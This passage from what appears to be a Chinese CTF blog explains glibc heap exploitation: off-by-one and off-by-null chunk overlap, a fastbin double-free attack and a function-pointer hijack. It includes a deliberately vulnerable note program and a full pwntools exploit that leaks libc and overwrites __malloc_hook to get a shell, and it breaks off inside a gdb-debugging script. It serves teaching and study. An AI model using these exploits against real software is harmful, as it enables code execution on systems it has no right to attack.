<code>pre_inused</code> 位来检查是否<code>double free</code>, 由于 <code>chunk2</code> 原来并没有被释放，所以 <code>pre_inused =1</code> ，于是可以过掉检查， 此时得到一个 <code>0x90</code> 的 <code>unsorted bin</code> , 同时 <code>chunk2</code> 在 这个 <code>unsorted bin</code>里面， <strong>overlap chunk 2</strong></p></li><li><p>此时再次 <code>malloc(0x38)</code> ， 会使用 <code>unsorted bin</code> 进行<strong>切割</strong>， 所以 在 <code>chunk 2</code> 的 <strong>fd, bk 处会写入 main_arean 的 地址</strong>， 打印 <code>chunk 2</code> 的内容就可以 <code>leak libc</code></p></li></ul><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>其实可以 <code>overlap chunk</code> 了，就相当于获得了 <code>堆溢出</code> 的能力，我们可以任意修改 <code>chunk</code> 的数据，此时可以使用 <code>unlink</code>, <code>unsorted bin attack</code>, <code>fastbin attack</code>。 没有限制内存分配的大小，使用 <code>fastbin attack</code> 即可</p><h6 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h6><p>这种情况下的 <code>unlink</code> 应该比较简单，在当前 <code>chunk</code> 伪造好 <code>fd, bk</code> 然后利用 <code>off by one</code> 修改 下一个 <code>chunk</code> 的 <code>pre_size</code> (由于不对齐的分配，这个区域其实属于当前 chunk ) 和 <code>size</code>的 <code>pre_inused</code> 为 <code>0</code>， 然后 <code>free</code> 掉下面那个 <code>chunk</code> ，就可以触发 <code>unlink</code> 了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172736.png" alt=""></p><h4 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h4><p>在这种情况下，我们只能溢出 <code>\x00</code> 字节， 所以会把 <code>size</code> 变小 同时 <code>inused</code> 位 会被设置为 <code>0</code></p><h5 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h5><p><code>B + 0x100</code> 处要设置好 <code>p64(xxx) + p64(0x41)</code> 关键是 <strong>pre_inused</strong> 位 ， <code>free</code> 的时候会检测这个位</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://xzfile.aliyuncs.com/media/upload/picture/20180423214606-abd8fc10-46fc-1.png" alt="img"></p><h5 id="shrink-free-chunk-size"><a href="#shrink-free-chunk-size" class="headerlink" title="shrink free chunk size"></a>shrink free chunk size</h5><h6 id="布局过程"><a href="#布局过程" class="headerlink" title="布局过程"></a>布局过程</h6><ul><li>首先分配 <code>3</code> 个 <code>chunk (A B D)</code> , 大小分别为 <code>0x110 , 0x210, 0x110</code></li><li>然后 释放 <code>B</code> ， 此时 <strong>D-&gt;pre_inused = 0 and D-&gt;pre_size = 0x210</strong></li><li>修改 <code>B+0x200</code> 处 为 <code>p64(0x200)</code> ，绕过新版 libc 的 <strong>chunksize(P) != prev_size (next_chunk(P))</strong> 检查</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172801.png" alt=""></p><ul><li>然后分配两个 <code>chunk (P, K)</code>, 大小为 <code>0x110, 0x90</code></li><li>释放掉 <code>P</code> , 此时 <code>P</code> 会进入 <code>unsorted bin</code> , <strong>fd, bk 是有效的</strong> <strong>， 原因是 后面合并 D 时需要 unlink</strong></li><li>释放 <code>D</code> , 发现 <code>D-&gt;pre_inused=0</code>, 说明前一个 <code>chunk</code> 已经 <code>free</code>, 需要合并。 根据 <code>pre_size</code> 找到 <code>P</code> , 然后 <code>unlink(P)</code> 合并得到一个 <code>0x330</code> 的 <code>unsorted bin</code>， 此时 <code>K</code> 位于 <code>unsorted bin</code> 内部， <strong>overlap chunk done</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172812.png" alt=""></p><h6 id="布局过程中的一些-tips"><a href="#布局过程中的一些-tips" class="headerlink" title="布局过程中的一些 tips"></a>布局过程中的一些 tips</h6><ul><li><p>在第三步 ，释放 B 之前把 <code>B+0x200</code> 处 设置 <code>p64(0x200)</code> ， 因为新版的 <code>libc</code> 会检验 <code>chunksize(P) != prev_size (next_chunk(P))</code></p></li><li><p><code>off by null</code> 缩小 <code>B</code> 以后，分配 <code>P</code> 其大小不能再 <code>fastbin</code> 的范围内，后面释放 <code>D</code> 需要向前合并，会进行 <code>unlink</code> 操作，所以大小 大于 <code>fastbin</code> ， <code>free(P)</code>后 <code>P</code> 会进入 <code>unsorted bin</code> ，此时他的 <code>fd</code> , <code>bk</code>都是正常的，正常 <code>unlink</code> 。</p></li></ul><p><strong>参考</strong><br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a></p><h5 id="修改-pre-inused-向前合并"><a href="#修改-pre-inused-向前合并" class="headerlink" title="修改 pre_inused + 向前合并"></a>修改 pre_inused + 向前合并</h5><h6 id="方案一-1"><a href="#方案一-1" class="headerlink" title="方案一"></a><strong>方案一</strong></h6><ul><li>首先分配 <code>4</code> 个 <code>chunk (A B C D)</code> , 大小分别为 <code>0x100, 0x100, 0x100, 0x80</code>. 最后那个用于防止 <code>top_chunk</code> 合并</li><li>然后释放 <code>A</code> , 此时 <code>A</code> 进入 <code>unsorted bin</code> , 生成了有效的 <code>FD</code> 和 <code>BK</code>，为了<strong>可以在后面的融合中成功 unlink</strong></li><li>然后利用 <code>off by null</code> , <strong>设置 C 的 pre_size 和 pre_inused</strong> 。</li><li>释放 <code>C</code> , 系统 根据 <strong>C 的 pre_size 找到 A 进行合并</strong>，首先 <code>unlink(A)</code> 因为 <code>A</code> 已经在 <code>unsorted bin</code>，不会出错，然后就会有一个 <code>0x300</code> 的 <code>unsorted bin</code> , 此时 <code>B</code> 位于 该 <code>unsorted bin</code> 的 中间</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172832.png" alt=""></p><h6 id="方案二-1"><a href="#方案二-1" class="headerlink" title="方案二"></a>方案二</h6><p>如果程序限制只能在触发 <code>off by null</code> 之后才能 释放 <code>A</code> ，需要在 <code>A</code> 和 <code>B</code> 之间多分配一个内存块 <strong>x（0x20)</strong>, 原因是 触发 <code>off by null</code> 后 <code>B</code> 被标识<strong>已经 free</strong> , 那么此时再 释放 <code>A</code> 就会对 <code>B</code> 进行 <code>unlink</code> ，此时 <code>B</code> 中 <code>fd</code> 和 <code>bk</code> 是过不了 检查的（<strong>B已经分配，并已经被用来进行 off by null</strong> ) 。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172842.png" alt=""></p><p><strong>参考</strong><br><a href="http://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">Libc堆管理机制及漏洞利用技术</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于堆相关的漏洞，不论是 堆溢出，double free, off by one ，uaf 等其最终目的都是为了修改 <code>chunk</code> 的一些管理结构 比如 <code>fd,bk</code>, 然后在后续的堆管理程序处理中实现我们的目的（代码执行）。</p><p><strong>堆溢出</strong></p><p>直接可以修改 下一个 <code>chunk</code> 的 元数据 ，然后就是 <code>unsorteb bin attack</code> , <code>fastbin attack</code> 等攻击手法了</p><p><strong>double free</strong></p><p>利用一些内存布局，可以实现 <code>overlap chunk</code> ,最后也是实现了 可以修改 <code>chunk</code> 的元数据</p><p><strong>off by one</strong></p><p>类似于 <code>double free</code> ，实现 <code>overlap chunk</code> 然后改 <code>chunk</code> 元数据</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fast_bin attack利用解释</title>
      <link href="/2019/07/19/fast-bin-attack-li-yong-jie-shi/"/>
      <url>/2019/07/19/fast-bin-attack-li-yong-jie-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​        主要通过Double Free在fast binY单链中存在两个指向同一内存块的指针，可能的排布（A2-&gt;B-A1）,第一次malloc该大小拿到A2指向该chunk,向其数据data写入<code>__malloc_hook</code>的地址（同时也修改了A1的fd,即也在该大小的fast bin的尾部增加了一个地址为<code>__malloc_hook</code>的内存chunk[fake chunk]）,所以当依次拿掉B,A1后，在malloc一次即可获取到指向<code>__malloc_hook</code>地址的指针，这时候你就爽了，通过修改其为其他函数地址（如one_gadget），malloc函数检查到<code>__malloc_hook</code>被设置后转向该hook函数进行“自定义”的malloc内存分配，即开了一个shell。</p><a id="more"></a><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre class="line-numbers language-C"><code class="language-C">void delete_note(){    printf("index:");    int idx = read_int();    if(note[idx]){ //指针不为NULL就delete        free(note[idx]);        //note[idx] = 0 double free        return;    }    puts("No such note");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="利用main-arena-leak-libc-base-address"><a href="#利用main-arena-leak-libc-base-address" class="headerlink" title="利用main_arena leak libc base address"></a>利用main_arena leak libc base address</h4><p>原理：main_arena 为libc动态共享库的数据段中一个全局变量，unsorted bin为一个双向链表，当一个chunk size 大于fast bin最大值的时候被放入的是unsorted bin,因为此刻是第一个chunk加入到unsorted bin，所以该chunk的fd,bk指针都指向main_arena地址，只要知道main_arena在该版本libc的偏移量就可以利用libc base = leaked_main_arena_addresss - libc_base_maps计算，其中libc_base_maps为关闭系统的aslr后程序加载libc的基地址：</p><p>参考：<a href="http://eternalsakura13.com/2018/04/03/babyheap/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/04/03/babyheap/</a></p><pre class="line-numbers language-shell"><code class="language-shell">cat /proc/sys/kernel/randomize_va_space  # 0,1,2# root 下通过 echo 0 > /proc/sys/kernel/randomize_va_space 关闭aslrcat /proc/117818/maps # 查看pid进程的内存映射 ps -aux | grep fast_bin# gdb下调试查看全局变量的地址p &__malloc_hook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="one-gadget-对应版本libc的offset不同"><a href="#one-gadget-对应版本libc的offset不同" class="headerlink" title="one_gadget 对应版本libc的offset不同"></a>one_gadget 对应版本libc的offset不同</h4><p>找到满足rsp+x = null的偏移</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563541417536.png" alt="1563541417536"></p><h4 id="运行效果如图"><a href="#运行效果如图" class="headerlink" title="运行效果如图"></a>运行效果如图</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563541529187.png" alt="1563541529187"></p><h3 id="完整程序与exp"><a href="#完整程序与exp" class="headerlink" title="完整程序与exp"></a>完整程序与exp</h3><ol><li>baby_fast_bin_attack</li></ol><pre class="line-numbers language-C"><code class="language-C">#include<stdio.h>#include<stdlib.h>#include<unistd.h>/****************简单的利用Double Free 漏洞leak libc地址（修改__malloc_hook为one gadget地址获取shell）fastbin attack*By yawn****************/char *note[10];int read_int(){    char buf[16];    if (__read_chk(0,buf,15,15)<=0){        puts("read error");        exit(1);    }    return (unsigned int)atoi(buf);}void add_note(){    for (int i=0;i<10;++i){        if(!note[i]){            printf("size:");            int size = read_int();            note[i] = malloc(size); //分配size个bytes（字节）            printf("what do you want to write:");            read(0,note[i],size);            return;        }    }    puts("Fulls!");}void delete_note(){    printf("index:");    int idx = read_int();    if(note[idx]){ //指针不为NULL就delete        free(note[idx]);        //note[idx] = 0 double free        return;    }    puts("No such note");}void show_note(){    printf("index:");    int idx = read_int();    if(note[idx]){        printf("%s",note[idx]);        return;    }    puts("No this note");}void menu(){    puts("--------------------");    puts("1.add a note");    puts("2.delete a note");    puts("3.show a note");    puts("4.exit");    puts("--------------------");    puts("Your choice:");}int main(){    setvbuf(stdin,0,2,0);    setvbuf(stdout,0,2,0);    setvbuf(stderr,0,2,0);    while(1){        menu();        switch( read_int()){            case 1:                add_note();                break;            case 2:                delete_note();                break;            case 3:                show_note();                break;            case 4:                printf("Bye!\n");                _exit(0);            default:                puts("Invalid choice!");                break;        }    }    return 0;}        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>EXP</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token comment" spellcheck="true">#!/usr/bin/python</span> <span class="token comment" spellcheck="true"># coding:utf-8</span> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fast_bin"</span><span class="token punctuation">)</span> libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"write:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0,free 掉之后一直都有的0还保留这原来的指针指向chunk</span> add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span> free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span> show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> main_arena <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>  libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b61</span> <span class="token comment" spellcheck="true"># leak 到 libc的基址 0x61 = a同步不会变</span> <span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre><code>add(0x68,'a') # 3add(0x68,'a') # 4free(3)free(4)free(3)print hex(libc.symbols['__malloc_hook'])add(0x68,p64(libc.symbols['__malloc_hook']-0x10-3)) # 伪造fake chunk(fast_bin) 分配到libc的内存add(0x68,'a')add(0x68,'a') # 露出伪造到libc的地址one_gadget = 0xf02a4add(0x68,'y'*3+p64(libc.address + one_gadget))p.interactive()```</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Double Free利用解释</title>
      <link href="/2019/07/17/double-free-li-yong-jie-shi/"/>
      <url>/2019/07/17/double-free-li-yong-jie-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    记录一道Double Free的利用手法，利用Double Free转为UAF达到控制程序流程目的。基本的思想一般是利用大小在fast_bin范围内的内存块间的错误解析，利用Double Free在fast_bin单向列表（后释放的在链表头，即LIFO的精确匹配分配）存放两个相同的内存块（Double free）A2-&gt;B-&gt;A1,在后面的malloc拿走A2,利用A2写入func_pointer，再一次malloc拿走B，在一次malloc一个包含函数调用指针的内存块，通过A2修改的指针已经覆盖了A1的函数指针，此时调用A1-&gt;func即运行写入的func_pointer。</p><a id="more"></a><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol start="0"><li><p>结构体</p><pre class="line-numbers language-C"><code class="language-C"> struct note {     void (*printnote)(); //函数指针     char *content ; };<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> add_note</p><pre class="line-numbers language-c"><code class="language-c"> <span class="token keyword">void</span> <span class="token function">print_note_content</span><span class="token punctuation">(</span><span class="token keyword">struct</span> note <span class="token operator">*</span>this<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">puts</span><span class="token punctuation">(</span>this<span class="token operator">-></span>content<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">void</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> note<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> note<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//先申请一个sizeof(note)的结构体大小的内存块，note的大小为=函数指针+指针大小=8+8bytes = 0x10，开始分配malloc后全部为0</span>             notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>printnote <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//函数指针，目标，覆盖该指针</span>             <span class="token comment" spellcheck="true">//show_note中会调用该函数</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>             notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//分配一个字符串content指针的地址空间，此处利用混淆，大小为note结构体大小</span>             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> delete_note:</p><pre class="line-numbers language-C"><code class="language-C">     if(notelist[idx]){         free(notelist[idx]->content);         free(notelist[idx]);         puts("Success");//没有对已经free的notelist[idx]进行清0，double free }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol start="0"><li><p>exp</p><pre class="line-numbers language-python"><code class="language-python"> add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># list[0]</span> add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># list[1]</span> show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第一次free</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563515512201.png" alt="1563515512201"></p></li><li><p>第二次free</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563515563252.png" alt="1563515563252"></p></li><li><p>两次free后的结果</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563518716629.png" alt="1563518716629"></p></li><li><p>chunk结构</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563519216997.png" alt="1563519216997"></p></li><li><p>两步add_note利用</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563519781053.png" alt="1563519781053"></p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools连gdb调试脚本</title>
      <link href="/2019/07/17/pwntools-lian-gdb-diao-shi-jiao-ben/"/>
      <url>/2019/07/17/pwntools-lian-gdb-diao-shi-jiao-ben/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    缘起于要了解pwntools编写exp脚本通过send或者sendline发送给二进制程序后，结合gdb调试此刻程序的运行状态，如堆分布。但通过下断点在程序手工输入payload未免太麻烦（也可以说是调试payload吧）。调试的效果如下</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563325392969.png" alt="1563325392969"></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h4><p>利用pwntools的gdb.attach()，直接写在exp里面</p><p>如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"hacknote_double_free"</span><span class="token punctuation">)</span>magic <span class="token operator">=</span> <span class="token number">0x400C23</span>pwnlib<span class="token punctuation">.</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 链接gdb调试，先在gdb界面按下n下一步返回python控制台enter继续(两窗口同步)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"to send choice"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 添加有意义的调试信息,关键的payload调试线pause一下</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token 